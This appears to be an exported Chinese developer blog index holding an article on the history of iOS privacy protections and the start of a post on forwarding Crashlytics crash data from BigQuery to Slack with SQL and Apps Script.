ProtectionSafari 會自動移除網址的 Tracking Parameter 參數 (e.g. fbclid 、 gclid …) 舉例： https://zhgchg.li/post/1?gclid=124 點擊後會變 https://zhgchg.li/post/1 目前測試 iOS 17 Developer Beta 4， fbxxx 、 gcxxx . .等等會被移掉， utm_ 是有保留的；不確定正式版 iOS 17 或日後 iOS 18 會不會再加強。 如果想知道最嚴格情況下的效果可安裝 iOS DuckDuckGo 瀏覽器進行測試。 詳細測試細節請參考「 iOS17 Safari 的新功能會把網址裡的 fbclid 跟 gclid 砍掉 」大大的這篇文章。Privacy Manifest .xprivacy &amp; Report開發者需把使用到的 User Privacy 宣告在內， 並也需要要求有使用到的 SDK 提供該 SDK 的 Privacy Manifest。*另外也增加第三方 SDK SignatureXCode 15 能透過 Manifest 產生 Privacy Report 供開發者在 App Store 上做 App 隱私設定。Required reason API為避免部分有機會得出 fingerprinting 的 Foundation API 被濫用，蘋果開始針對部分 Foundation API 做管控； 需要在 Mainfest 中宣告為何要使用 。目前比較有影響的是 UserDefault 即屬於要宣告的 API。從 2023 年秋季開始，如果你上傳到 App Store Connect 的新 App 或 App 更新使用了需要聲明原因的 API (包括來自第三方 SDK 的內容)，而你沒有在 App 的隱私清單中提供批准的原因，那麼你會收到通知。從 2024 年春季開始，若要將新 App 或 App 更新上傳到 App Store Connect，你需要在 App 的隱私清單中註明批准的原因，以準確反映你的 App 如何使用相應 API。如果目前批准原因的涵蓋範圍內並未包含某個需要聲明原因的 API 的用例，且你確信這個用例可讓你的 App 用戶直接受益，請告訴我們。Tracking Domain發送 Tracking 資訊的 API Domain 需宣告在 privacy manifest .xprivacy 並在使用者同意追蹤後才能發起網路請求，否則此 Domain 的網路請求全部都會被系統攔截。可從 XCode Netowrk 工具中檢查 Tracking Domain 是否被攔截：目前實測 Facebook、Google 的 Tracking Domain 都會被偵測到，需要照規定列入 Tracking Domain 並詢問權限。 graph.facebook.com : Facebook 相關數據統計 app-measurement.com : Google 相關數據統計：GA/Firebase….因此請注意 FB/Google 數據統計在 iOS 17 後可能會大幅流失，因為未詢問權限、不允許追蹤，會完全收不到數據；根據以往實作詢問追蹤的成效，大約有 7 成的使用者都會按不允許。 開發者自己的打 API 送 Tracking 方式，蘋果也說需要同上列管 Tracking Domain 如果 Tracking Domain 跟 API Domain 相同則需分開一個獨立的 Tracking Domain (e.g. api.zhgchg.li -&gt; tracking.zhgchg.li) 目前暫時無法知道蘋果如何控管開發者自己的 Tracking，用 XCode 15 測試自家的沒有被發現。 不清楚官方是否會用工具檢測行為、或是審核人員人工查看 fingerprinting 依然禁止。前言這次很榮幸能參加 MOPCON 演講 ，但因疫情關係改成線上直播形式蠻遺憾的，無法認識更多新朋友；這次演講的主題是「iOS 隱私與便利的前世今生」主要想跟大家分享 Apple 關於隱私的原則及這些年來 iOS 基於這些隱私原則所做的功能調整。iOS 隱私與便利的前世今生 | Pinkoi, We Are Hiring!相信這幾年開發者或是 iPhone 用戶應該都對以下功能調整並不陌生： iOS ≥ 13： 所有支援第三方登入的 App 都需要多實作 Sign in with Apple，否則無法成功上架 App iOS ≥ 14： 剪貼簿存取警告 iOS ≥ 14.5： IDFA 必須允許後才能存取，幾乎等同封殺 IDFA iOS ≥ 15 ：Private Relay，使用 Proxy 隱藏使用者原始 IP 位址 iOS ≥ 16 ：剪貼簿存取需使用者授權 ….還有很多很多，會在文章後跟大家分享Why?如果不清楚 Apple 的隱私原則，甚至會覺得為何 Apple 這幾年不斷地在跟開發者、廣告商作對？很多大家用得很習慣的功能都被封鎖了。再追完「 WWDC 2021 — Apple’s privacy pillars in focus 」及「 Apple privacy white paper — A Day in the Life of Your Data 」兩份文件後如夢初醒，原來我們早已在不知不覺中洩漏許多個人隱私並且讓廣告商或社群媒體賺的盆滿缽滿，在我們的日常生活中已經達到無孔不入的境界。參考 Apple privacy white paper 改寫，以下以虛構人物哈里為例；為大家講述隱私是如何洩漏的及可能造成的危害。首先是哈里 iPhone 上的使用紀錄。左邊是網頁瀏覽紀錄： 可以看到分別造訪了跟車子、iPhone 13、精品有關的網站右邊是已安裝的 App： 有投資、旅遊、社交、購物、還有嬰兒攝影機…這些 App哈里的線下人生線下活動會留下記錄的地方例如：發票、信用卡刷卡紀錄、行車記錄器…等等組合你可能會想說，我瀏覽不同的網站、裝不同的 App (甚至根本沒登入)、再到線下活動怎麼可能有機會讓某個服務串起所有資料？答案是：就技術手段是有的，而且「可能」或是「已經」局部發生。如上圖所示： 未登入時網站與網站之間可以透過 Third-Party Cookie、IP Address + 裝置資訊算出的 Fingerprint 在不同網站中識別出同個瀏覽者。 登入時網站與網站之間可以透過註冊資料，如姓名、生日、電話、Email、身分證字號…串起你的資料 App 與 App 之間可以透過取得 Device UUID 在不同 App 中識別出同個使用者、URL Scheme 嗅探手機上其他已安裝的 App、Pasteboard 在 App 與 App 間傳遞資料；另外一樣也可在使用者登入後用註冊資料串起資料。 App 與網站之間同樣可以用 Third-Party Cookie、Fingerprint、Pasteboard 傳遞資料 線上與線下活動的串連可能發生在，銀行端蒐集信用卡消費記錄、記帳 App、發票蒐集 App、行車記錄器 App…等等，都有機會把線下活動與線上資料串接在一起 事實證明，技術上是可行的；那究竟躲在所有網站、App 之後的第三方是誰呢？諸如家大業大的 Facebook、Google 都靠個人廣告獲得不少收益；許多網站、App 也都會串接 Facebook、Google SDK…所以一切都很難說，這還是看得到，更多時候我們根本不知道網站、App 用了哪些第三方廣告、數據蒐集服務，在背後偷偷紀錄著我們的一舉一動。我們假設哈里所有的活動，背後都偷藏著同一個第三方在默默收集他的資料，那麼在它的眼裡，哈里可能的輪廓如下：左邊是個人資料，可能來自網站註冊資料、外送資料；右邊是依照哈里的活動紀錄打上的行為、興趣標籤。在它眼中的哈里，可能比哈里還更了解自己；這些資料用在社交媒體，可以讓使用者更加沈淪；用在廣告上，可以刺激哈里過度消費或是營造鳥籠效應(EX: 推薦你買新褲子，你買了褲子就會買合適的鞋子來穿搭，買了鞋子就會再買襪子…沒完沒了)。如果你覺得以上已經夠可怕了，還有更可怕的：有你的個人資料又知道你的經濟狀況…要做惡的話不敢想像，例如：綁架、竊盜…目前的隱私保護方式 法律規範 (EX: SGS-BS10012 個資驗證、CCPA、GDPR…) 隱私權協議、去識別化主要還是透過法規約束；很難確保服務 100% 隨時遵守、網路上惡意程式也很多也難保證服務不會被駭造成資料外洩；總之還是「 要做惡技術上都可行，單靠法規跟企業良心約束 」。除此之外更多時候，我們是「被迫」接受隱私權條款的，無法針對個別隱私授權，要馬整個服務都不用，要馬就是用但要接受全部隱私權條款；還有隱私條款不透明，不知道會怎麼被收集及應用，更不知道背後有沒有還躲著一個第三方在你根本不知道情況下蒐集你的資料。另外 Apple 還有提到關於未成年人的個人隱私，多半也都在監護人未同意的情況下被服務蒐集。Apple’s privacy principles知道個人隱私洩露帶來的危害之後，來看一下蘋果的隱私原則。節錄自 Apple Privacy White Paper 蘋果的理想不是完全封殺而是平衡，例如這幾年很多人都會直接裝 AD Block 完全阻斷廣告，這也不是蘋果想看到的；因為如果完全斷開就很難做出更好的服務。賈伯斯在 2010 年的 All Things Digital Conference 說過： 我相信人是聰明的，有些人會比其他人更想分享數據，每次都去問他們，讓他們煩到叫你不要再問他們了，讓他們精準的知道你要怎麼使用他們的資料。 — translate by Chun-Hsiu Liu 蘋果相信隱私是基本人權蘋果的四個隱私原則： Data Minimization：只取用你需要的資料 On-Device Processing：Apple 基於強大的處理器晶片，如非必要，個人隱私相關資料應在本地執行 User Transparency and Control：讓使用者了解哪些隱私資訊被蒐集？被用在哪？另外也要讓使用者能針對個別隱私資料分享開關控制 Security：確保資料儲存、傳遞的安全iOS 基於保護個人隱私的歷年功能調整了解到個人隱私洩露的危害及蘋果的隱私原則後，回到技術手段上；我們可以來看看 iOS 這些年來針對保護個人隱私的功能調整有哪些。網站與網站之間前面有提到第一種方法可以用 Third-Party Cookie 跨網站串起瀏覽者資料： 🈲，在 iOS &gt;= 11 後的 Safari 都實裝了 Intelligent Tracking Prevention ( WebKit )預設啟用，瀏覽器會主動辨識用於追蹤、廣告的第三方 Cookie 加以阻擋；並且在每年的 iOS 版本不斷地加強辨識程式防止遺漏。透過 Third-Party Cookie 跨網站追蹤使用者這條路，在 Safari 上基本上已經行不通了。第二種方法是用 IP Address + 裝置資訊算出的 Fingerprint 在不同網站中識別出同個瀏覽者： 🈲，iOS &gt;= 15 Private Relay尤其在 Third-Party Cookie 被禁之後，有越來越多服務採用這個方法，蘋果也知道…所幸在 iOS 15 連 IP 資訊都給你混淆了！Private Relay 服務會將使用者的原始請求先隨機送到蘋果的 Ingress Proxy，再由蘋果隨機分派到合作 CDN 的 Egress Proxy，再由 Egress Proxy 去請求目標網站。整個流程都經過加密只有自己 iPhone 的晶片解的開，也只有自己同時知道 IP 與請求的目標網站；蘋果的 Ingress Proxy 只知道你的 IP、CDN 的 Egress Proxy 只知道蘋果的 Ingress Proxy IP 跟請求的目標網站、網站只知道 CDN 的 Egress Proxy IP。從應用角度來看，同一個地區的所有裝置都會使用同個共享的 CDN 的 Egress Proxy IP 來請求目標網站；也因此網站端無法再用 IP 當成 Fingerprint 資訊。技術細節可參考「 WWDC 2021 — Get ready for iCloud Private Relay 」。補充 Private Relay： Apple/CDN Provider 都沒有完整 Log 可追朔：查了下這樣蘋果怎麼防止被用在惡意的地方，沒找到答案；可能就跟蘋果也不會幫 FBI 解鎖罪犯 iPhone 一樣意思吧；隱私是所有人的基本人權。 預設開啟，不需特別連接 不影響速度、效能 IP 會保證在同個國家和時區 （使用者可選模糊城市）、無法指定 IP 只對部分流量有效 iCloud+ 用戶：所有 Safari 上的流量 + App 中的 Insecure HTTP Request一般用戶：僅對 Safari 上網站安裝的第三方追蹤工具有效 官方有提供 CDN Egress IP List 供網站開發者辨認 (不要誤 Blocking Egress IP，會造成群體傷害) 網路管理者可 Ban 掉 DNS 對所有連接者停用 Private Relay iPhone 可針對特定網路連線停用 Private Relay 連接 VPN/ 掛 Proxy 時會停用 Private Relay 目前還在 Beta 版 (2021/10/24)，啟用後部分服務可能會連不上 (中國地區、中國版抖音)或是服務會頻繁被登出Private Relay 實測圖 圖一 未啟用：原始 IP 位址 圖二 啟用 Private Relay — 保持一般位置：IP變成 CDN IP 但依然在 Taipei 圖三 啟用 Private Relay — 使用國家和時區（擴大模糊）：IP變成 CDN IP &amp; 變在 Taichung，但依然還是同個時區和國家測試專案App 可以用 URLSessionTaskMetrics 分析 Private Relay 的連接紀錄。扯遠了，因此用 IP 位址得到 Fingerprint 去辨識使用者的方法，也無法再使用了。App 與 App 之間第一種方式是早期可以直接存取 Device UUID： 🈲，iOS &gt;= 7 禁止存取 Device UUID, 使用 IDentifierForAdvertisers/IDentifierForVendor 取代 IDFV： 同個開發者帳號下的所有 App 能拿到同一個 UUID； 搭配 KeyChain 也是目前使用者 UUID 的辨識方法 。 IDFA： 不同開發者、不同 App 之間能拿到相同的 UUID，但是 IDFA 使用者可以重設或禁用。 🈲，iOS &gt;= 14.5 IDentifierForAdvertisers 需詢問後才能使用iOS 14.5 後蘋果加強對 IDFA 的取用限制，App 需要先詢問使用者允不允許追蹤後才能取得 IDFA UUID；未詢問、未允許的情況下都拿不到值。市調公司初步調查數據大約有 7成的使用者(最新數據有人說 9 成)都不允許追蹤取用 IDFA，所以大家才會說 IDFA 已死！測試專案App 與 App 之間互通有無的第二種方法是 URL Scheme：iOS App 可以使用 canOpenURL 去探測使用者手機上有沒有裝某個 App。 🈲，iOS &gt;= 9 需先在 App 內設定才能使用；不能任意探測。 iOS ≥ 15 新增限制，最多只能設定 50 組其他 App 的 Scheme。 Apps linked on or after iOS 15 are limited to a maximum of 50 entries in the LSApplicationQueriesSchemes key.網站 與 App 之間同前文所述第一種方法也是透過 Cookie 來串接：早期 iOS Safari 的 Cookie 跟 App WebView 的 Cookie 是可以互通的，可以藉此串起 網站與 App 之間的資料。做法可以在 App 畫面上偷塞一個 1 pixel 的 WebView 元件在背景偷偷讀取 Safari Cookie 回來用。 🈲，iOS &gt;= 11 禁止 Safari 和 App WebView 間共用 Cookie如果有需要取得 Safari 的 Cookie (EX: 直接使用網站 Cookie 登入)，可以使用 SFSafariViewController 元件取得；但此元件強迫跳提示視窗且無法客製化，確保使用者不會在無意間被偷取 Cookie。第二種方法是同網站與網站用IP Address + 裝置資訊算出的 Fingerprint 在不同網站中識別出同個瀏覽者：同前述， iOS ≥ 15 已被 Private Relay 混淆。最後一種也是唯一還能的方法 — Pasteboard ：使用剪貼簿串接跨平台的資訊，因為蘋果不可能禁用剪貼簿跨 App 使用，但是它可以提示使用者。 ⚠️ iOS &gt;= 14 新增剪貼簿存取警告⚠️ 2022/07/22 Update: iOS 16 Upcoming ChangesiOS ≥ 16 開始非使用者主動操作貼上動作，App 主動讀取剪貼簿的行為會跳出詢問視窗，使用者需要按允許，App 才能讀取到剪貼簿資訊。UIPasteBoard’s privacy change in iOS 16使用 Pasteboard 實現 Deferred Deep Link 延遲深度連結實作 這邊要多提一下關於 iOS 14 剪貼簿的隱私恐慌，詳細可參考我之前的文章「 iOS 14 剪貼簿竊資恐慌，隱私與便利的兩難 」雖然不能排除讀取剪貼簿是想竊資，但更多時候是我們 App 需要提供更好的使用體驗：在沒有實現 Deferred Deep Link 延遲深度連結之前，當我們引導使用者從網站上去安裝 App，安裝完成後打開 App 默認只會打開首頁；更好的使用體驗應該是打開 App 回復到網頁上停留的頁面的 App 對應頁。要實現這個功能就需要 網站與 App 之間有機會串起資料，如文章前述的其他方法都已被封禁，目前僅能透過剪貼簿做為資訊儲存媒介（如上圖）。包含 Firebase Dynamic Links、Branch.io 最新版(之前 Branch.io 用 IP Adrees Fingerprint 來實現)也都使用剪貼簿做 Deferred Deep Link。實作可參考我之前的文章： iOS Deferred Deep Link 延遲深度連結實作(Swift) 一般情況下如果是為了要做到 Deferred Deep Link 僅會在第一次打開 App、重新返回 App 那一刻去讀取剪貼簿資訊；不會在使用中或奇怪的時間點讀取，這一點值得注意。更好的做法是先用 UIPasteboard.general.detectPatterns 探測剪貼簿的資料是不是我們需要的，是在讀取。測試專案iOS ≥ 15 之後優化了剪貼簿提示，如果是使用者自己的貼上動作，就不會再跳提示了！廣告成效解決方案同前文所說的蘋果隱私原則，希望的是平衡而不是完全阻斷使用者與服務。網站與網站的廣告成效統計：Safari 上相對於阻擋 Intelligent Tracking Prevention 的功能就是 Private Click Measurement ( WebKit ) 用於在去除個人隱私的情況下統計廣告成效。具體流程如上圖，使用者在 A 網站點擊廣告前往 B 網站時，會在瀏覽器上紀錄一個 Source ID (識別同個使用者用) 與 Destination 資訊 (目標網站)；當使用者在 B 網站上完成轉換也會紀錄一個 Trigger ID (代表什麼動作) 在瀏覽器上。這兩個資訊會合併起來在隨機 24 ~ 48 小時後傳送到 A 和 B 網站得到廣告成效。一切都是 on-device safari 自行處理、防範惡意點擊也是由 Safari 提供保護。App 與 網站或 App 之間的廣告成效統計：可以使用 SKAdNetwork (需向蘋果申請加入) 類似 Private Click Measurement 方式，不再展開贅述。 可以多提一下，蘋果並非閉門造車； SKAdNetwork 目前來到 2.0 版本，蘋果持續收集開發者廣告商的需求綜合個人隱私控管，持續優化 SDK 功能。 這邊真心許願 Deferred Deep Link 能用 SDK 串起，因為我們是為了提升使用者體驗，沒有要侵犯個人隱私的意思。技術細節可參考「 WWDC 2021 — Meet privacy-preserving ad attribution 」。Cross-Platform iOS ≥ 13 所有支援第三方登入的 App 都需要多實作 Sign in with Apple，否則無法成功上架 App 姓名可自行編輯 可隱藏真實 Email (使用蘋果產的虛擬 Email 代替) 使用者可要求刪除帳號 2022/01/31 前 App 須完成實作 🆕 iOS &gt;= 15 iCloud+ 用戶支援 Hide My Email 支援 Safari、App 所有信箱欄位 使用者可到設定中任意產生虛擬信箱同 Sign in with Apple 使用蘋果產的虛擬 Email 代替真實信箱，在收到信後蘋果會轉發到你的真實信箱中，藉此保護你的信箱資訊。類似 10 分鐘信箱，但又更強大；只要不停用，那組虛擬信箱地址就是你永久持有；也沒有新增上限，可以無限新增，不確定蘋果如何防止濫用。設定 -&gt; Apple ID -&gt; 隱藏我的電子郵件OthersApp privacy details on the App Store： App 必需在 App Store 上說明使用者哪些資料會被追蹤及如何應用 。詳細說明可參考：「 App privacy details on the App Store 」。個人隱私資料細微控制： iOS ≥ 14 開始，位置及相片存取可以更細微的控制，可以只授權取用某幾張相片、只允許 App 使用中存取位置。測試專案 iOS ≥ 15，增加 CLLocationButton 按鈕提升使用者體驗，可以在未詢問/未同意情況下透過使用者點擊取得當前位置，此按鈕無法客製化、只能透過使用者操作觸發。個人隱私取用提示： iOS ≥ 15，增加個人隱私功能的取用提示，如：剪貼簿、位置、相機、麥克風App 隱私取用報告： iOS ≥ 15，可以匯出近 7 天手機所有 App 的隱私相關功能取用、網路活動的紀錄報告。 因紀錄報告檔案是 .ndjson 純文字檔，直接查看不易；可以先在 App Store 下載「 隱私洞見 」App 用來查看報告 到設定 -&gt; 隱私權 -&gt; 最下方「紀錄 App 活動」-&gt; 啟用紀錄 App 活動 儲存 App 活動 選擇「匯入到 隱私洞見 」 匯入完成後即可檢視隱私報告可以看到同 新聞 所說，Wechat 的確會再啟動 App 時在背景偷偷讀取相片資訊。 另外我也多抓到幾個中國 App 也會偷做事，直接在設定全部禁用它們的權限了。 要不是有這個功能讓他們見光死，還不知道我們的資料會被竊取多久！RecapApple’s privacy principles了解完歷年對於隱私功能的調整後，我們回頭來看蘋果的隱私原則： Data Minimization：蘋果用技術手段限制取用需要的資料 On-Device Processing：隱私資料不上傳雲端，一切都在本地處理；如 Safari Private Click Measurement、蘋果的 機器學習 SDK CoreML 也都是在本地執行、iOS ≥ 15 的 Siri/相機原況文字功能、Apple Map、News、相片識別功能…等等 User Transparency and Control：新增的各種隱私存取提示、紀錄報告及隱私細微控制功能 Security：資料儲存傳遞的安全，不濫用 UserDefault、iOS 15 可以直接用 CryptoKit 來做點對點加解密、Private Realy 的傳輸安全破碎資料回到最一開始用技術手段拼湊出哈里的關聯圖，網站與網站或 App 之間被堵死，只剩剪貼還能用，但會有提示。服務註冊跟第三方登入的個資，可以改用 Sign in with apple 和 hide my email 功能防堵；或是多使用 iOS 原生 App。線下活動或許可以改 Apple Card 防止隱私外洩？ 已沒有人有機會拼湊出哈里的活動輪廓。Apple 以人為本因此「以人為本」是我會給蘋果的理念的代名詞，要與商業市場唱反調需要很大的信念；與它相關的「以科技為本」是我會給 Google 的代名詞，因為 Google 總能造出很多 Geek 科技項目；最後「以商業為本」是我會給 Facebook 的代名詞，因為 FB 在很多層面上都只追求商業收益。除了針對隱私功能的調整，這幾年的 iOS 也不斷加強防止手機沈迷的功能，推出了「螢幕使用時間報告」、「App 使用時間限制」、「專注模式」…等等功能；幫助大家解除手機成癮。最後希望大家都能 重視個人隱私 不被資本控制 減少虛擬成癮 防止社會沈淪 在現實世界活出精彩人生！Private Relay/IDFA/Pasteboard/Location 測試專案：參考資料 WWDC 2021 — Apple’s privacy pillars in focus Apple privacy white paper — A Day in the Life of Your Data WWDC 2021 — Get ready for iCloud Private Relay WWDC 2021 — Meet privacy-preserving ad attribution iOS 14 剪貼簿竊資恐慌，隱私與便利的兩難 iOS Deferred Deep Link 延遲深度連結實作(Swift) iOS UUID 的那些事 (Swift/iOS ≥ 6)有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 3,402 Total Views Last Statistics Date: 2025-08-15 | 3,100 Views on Medium." }, { "title": "Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具", "url": "/posts/zrealm-dev/crashlytics-big-query-%E6%89%93%E9%80%A0%E6%9B%B4%E5%8D%B3%E6%99%82%E4%BE%BF%E5%88%A9%E7%9A%84-crash-%E8%BF%BD%E8%B9%A4%E5%B7%A5%E5%85%B7-e77b80cc6f89/", "categories": "ZRealm Dev.", "tags": "ios-app-development, crashlytics, firebase, bigquery, slack", "date": "2021-10-19 22:33:30 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具串接 Crashlytics 和 Big Query 自動轉發閃退記錄到 Slack Channel成果Pinkoi iOS Team 實拍...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具串接 Crashlytics 和 Big Query 自動轉發閃退記錄到 Slack Channel成果Pinkoi iOS Team 實拍圖先上成果圖，每週定時查詢 Crashlytics 閃退紀錄；篩選出閃退次數前 10 多的問題；將訊息發送到 Slack Channel，方便所有 iOS 隊友快速了解目前穩定性。問題於 App 開發者來說 Crash-Free Rate 可以說是最重要的衡量指標；數據代表的意思是 App 的使用者 沒遇到 閃退的比例，我想不管是什麼 App 都應該希望自己的 Crash-Free Rate ~= 99.9%；但現實是不可能的，只要是程式就可能會有 Bug 更何況有的閃退問題是底層(Apple)或第三方 SDK 造成的，另外隨著 DAU 體量不同，也會對 Crash-Free Rate 有一定影響，DAU 越高越容易踩到很多偶發的閃退問題。既然 100% 不會閃退的 App 並不存在，那如何追蹤、處理閃退就是一件很重要的事；除了最常見的 Google Firebase Crashlytics (前生 Fabric) 外其實還有其他選擇 Bugsnag 、 Bugfender …各工具我沒有實際比較過，有興趣的朋友可以自行研究；如果是用其他工具就用不到本篇文章要介紹的內容了。Crashlytics選擇使用 Crashlytics 有以下好處： 穩定，由 Google 撐腰 免費、安裝便利快速 除閃退外，也可 Log Error Event (EX: Decode Error) 一套 Firebase 即可打天下：其他服務還有 Google Analytics、Realtime Database、Remote Config、Authentication、Cloud Messaging、Cloud Storage… 題外話：不建議正式的服務完全使用 Firebase 搭建，因為後期流量起來後的收費會很貴…就是個養套殺的概念。Crashlytics 缺點也很多： Crashlytics 不提供 API 查詢閃退資料 Crashlytics 僅會儲存近 90 天閃退紀錄 Crashlytics 的 Integrations 支援跟彈性極差最痛的就是 Integrations 支援跟彈性極差再加上又沒有 API 可以自己寫腳本串閃退資料；只能三不五時靠人工手動上 Crashlytics 查看閃退紀錄，追蹤閃退問題。Crashlytics 只支援的 Integrations： [Email 通知] — Trending stability issues (越來越多人遇到的閃退問題) [Slack, Email 通知] — New Fatal Issue (閃退問題) [Slack, Email 通知] — New Non-Fatal Issue (非閃退問題) [Slack, Email 通知] — Velocity Alert (數量突然一直上升的閃退問題) [Slack, Email 通知] — Regression Alert (已 Solved 但又出現的問題) Crashlytics to Jira issue以上 Integrations 的內容、規則都無法客製化。最一開始我們直接使用 2.New Fatal Issue to Slack or Email，to Email 的話再由 Google Apps Script 觸發後續處理腳本 ；但是這個通知會瘋狂轟炸通知頻道，因為不管是大是小或只是使用者裝置、iOS 本身很零星的問題造成的閃退都會通知；隨著 DAU 增長每天都被這通知狂轟濫炸，而其中真的有價值，很多人踩到而且是跟我們程式錯誤有關的通知大概只佔其中的 10%。以至於根本沒有解決 Crashlytics 難以自動追蹤的問題，一樣要花很多時間在審閱這個問題究竟重不重要之上。Crashlytics + Big Query轉來轉去只找到這個方法，官方也只提供這個方法；這就是免費糖衣下的陷阱，我猜不管是 Crashlytics 或 Analytics Event 都不會也沒有計劃推出 API 讓使用者可以串 API 查資料；因為官方的唯一建議就是把資料匯入到 Big Query 使用，而 Big Query 超過免費儲存與查詢額度是要收費的。 儲存：每個月前 10 GB 為免費。 查詢：每個月前 1 TB 為免費。 (查詢額度的意思是下 Select 時處理了多少容量的資料) 詳細可參考 Big Query 定價說明Crashlytics to Big Query 的設定細節可參考 官方文件 ，需啟用 GCP 服務、綁定信用卡…等等。開始使用 Big Query 查詢 Crashlytics Log設好 Crashlytics Log to Big Query 匯入週期＆完成第一次匯入有資料後，我們就能開始查詢資料囉。首先到 Firebase 專案 -&gt; Crashlytics -&gt; 列表右上方的「•••」-&gt; 點擊前往「BigQuery dataset」。前往 GCP -&gt; Big Query 後可在左方「Exploer」中選擇「firebase_crashlytics」-&gt;選擇你的 Table 名稱 -&gt;「Detail」 -&gt; 右邊可查看 Table 資訊，包含最新修改時間、已使用容量、儲存期限…等等。 確認已有匯入的資料可查詢。上方 Tab 可切換到「SCHEMA」查看 Table 的欄位資訊或參考 官方文件 。點擊右上方的「Query」可開啟帶有輔助 SQL Builder 的介面(如對 SQL 不熟建議使用這個)：或直接點「COMPOSE NEW QUERY」開一個空白的 Query Editor：不管是哪種方法，都是同個文字編輯器；在輸入完 SQL 之後可以預先在右上方自動完成 SQL 語法檢查和預計會花費的查詢額度( This query will process XXX when run. )：確認要查詢後點左上方「RUN」執行查詢，結果會在下方 Query results 區塊顯示。 ⚠️ 按下「RUN」執行查詢後就會累積到查詢額度，然後進行收費；所以請注意不要亂下 Query。如對 SQL 較陌生可以先了解基本用法，然後參考 Crashlytics 官方的範例下去魔改 ：1.統計近 30 日每天的閃退次數：SELECT COUNT(DISTINCT event_id) AS number_of_crashes, FORMAT_TIMESTAMP(\"%F\", event_timestamp) AS date_of_crashesFROM `你的ProjectID.firebase_crashlytics.你的TableName`GROUP BY date_of_crashesORDER BY date_of_crashes DESCLIMIT 30;2.查詢近 7 天最常出現的 TOP 10 閃退：SELECT DISTINCT issue_id, COUNT(DISTINCT event_id) AS number_of_crashes, COUNT(DISTINCT installation_uuid) AS number_of_impacted_user, blame_frame.file, blame_frame.lineFROM `你的ProjectID.firebase_crashlytics.你的TableName`WHERE event_timestamp &gt;= TIMESTAMP_SUB(CURRENT_TIMESTAMP(),INTERVAL 168 HOUR) AND event_timestamp &lt; CURRENT_TIMESTAMP()GROUP BY issue_id, blame_frame.file, blame_frame.lineORDER BY number_of_crashes DESCLIMIT 10; 但官方範例這個下法查出來的資料跟 Crashlytics 看到的排序不一樣，應該是它用 blame_frame.file (nullable), blame_frame.line (nullable) 去 Group 的原因導致。3.查詢近 7 天最常閃退的 10 種裝置：SELECT device.model,COUNT(DISTINCT event_id) AS number_of_crashesFROM `你的ProjectID.firebase_crashlytics.你的TableName`WHERE event_timestamp &gt;= TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 168 HOUR) AND event_timestamp &lt; CURRENT_TIMESTAMP()GROUP BY device.modelORDER BY number_of_crashes DESCLIMIT 10;更多範例請參考 官方文件 。 如果你下的 SQL 無任何資料，請先確定指定條件的 Crashlytics 資料已匯入 Big Query（例如預設的 SQL 範例會查當天 Crash 紀錄，但其實資料還沒同步匯入進來，所以會查不到）；如果確定有資料，再來檢查篩選條件是否正確。Top 10 Crashlytics Issue Big Query SQL這邊參考第 2. 的官方範例修改，我們希望的結果是跟我們看 Crashlytics 第一頁時一樣的閃退問題及排序資料。近 7 日閃退問題的 Top 10：SELECT DISTINCT issue_id, issue_title, issue_subtitle, COUNT(DISTINCT event_id) AS number_of_crashes, COUNT(DISTINCT installation_uuid) AS number_of_impacted_user FROM `你的ProjectID.firebase_crashlytics.你的TableName`WHERE is_fatal = true AND event_timestamp &gt;= TIMESTAMP_SUB( CURRENT_TIMESTAMP(), INTERVAL 7 DAY ) GROUP BY issue_id, issue_title, issue_subtitle ORDER BY number_of_crashes DESC LIMIT 10;比對 Crashlytics 的 Top 10 閃退問題結果，符合✅。使用 Google Apps Script 定期查詢＆轉發到 Slack前往 Google Apps Script 首頁 -&gt; 登入與 Big Query 同個帳戶 -&gt; 點左上角「新專案」，開啟新專案後可點左上方重新命名專案。首先我們先完成串接 Big Query 取得查詢資料：參考 官方文件 範例，將上面的 Query SQL 帶入。function queryiOSTop10Crashes() { var request = { query: 'SELECT DISTINCT issue_id, issue_title, issue_subtitle, COUNT(DISTINCT event_id) AS number_of_crashes, COUNT(DISTINCT installation_uuid) AS number_of_impacted_user FROM `firebase_crashlytics.你的TableName` WHERE is_fatal = true AND event_timestamp &gt;= TIMESTAMP_SUB( CURRENT_TIMESTAMP(), INTERVAL 7 DAY ) GROUP BY issue_id, issue_title, issue_subtitle ORDER BY number_of_crashes DESC LIMIT 10;', useLegacySql: false }; var queryResults = BigQuery.Jobs.query(request, '你的ProjectID'); var jobId = queryResults.jobReference.jobId; // Check on status of the Query Job. var sleepTimeMs = 500; while (!queryResults.jobComplete) { Utilities.sleep(sleepTimeMs); sleepTimeMs *= 2; queryResults = BigQuery.Jobs.getQueryResults(projectId, jobId); } // Get all the rows of results. var rows = queryResults.rows; while (queryResults.pageToken) { queryResults = BigQuery.Jobs.getQueryResults(projectId, jobId, { pageToken: queryResults.pageToken }); Logger.log(queryResults.rows); rows = rows.concat(queryResults.rows); } var data = new Array(rows.length); for (var i = 0; i &lt; rows.length; i++) { var cols = rows[i].f; data[i] = new Array(cols.length); for (var j = 0; j &lt; cols.length; j++) { data[i][j] = cols[j].v; } } return data}query： 餐數可任意更換成寫好的 Query SQL。回傳的物件結構如下：[ [ \"67583e77da3b9b9d3bd8feffeb13c8d0\", \"&lt;compiler-generated&gt; line 2147483647\", \"specialized @nonobjc NSAttributedString.init(data:options:documentAttributes:)\", \"417\", \"355\" ], [ \"a590d76bc71fd2f88132845af5455c12\", \"libnetwork.dylib\", \"nw_endpoint_flow_copy_path\", \"259\", \"207\" ], [ \"d7c3b750c3e5587c91119c72f9f6514d\", \"libnetwork.dylib\", \"nw_endpoint_flow_copy_path\", \"138\", \"118\" ], [ \"5bab14b8f8b88c296354cd2e\", \"CoreFoundation\", \"-[NSCache init]\", \"131\", \"117\" ], [ \"c6ce52f4771294f9abaefe5c596b3433\", \"XXX.m line 975\", \"-[XXXX scrollToMessageBottom]\", \"85\", \"57\" ], [ \"712765cb58d97d253ec9cc3f4b579fe1\", \"&lt;compiler-generated&gt; line 2147483647\", 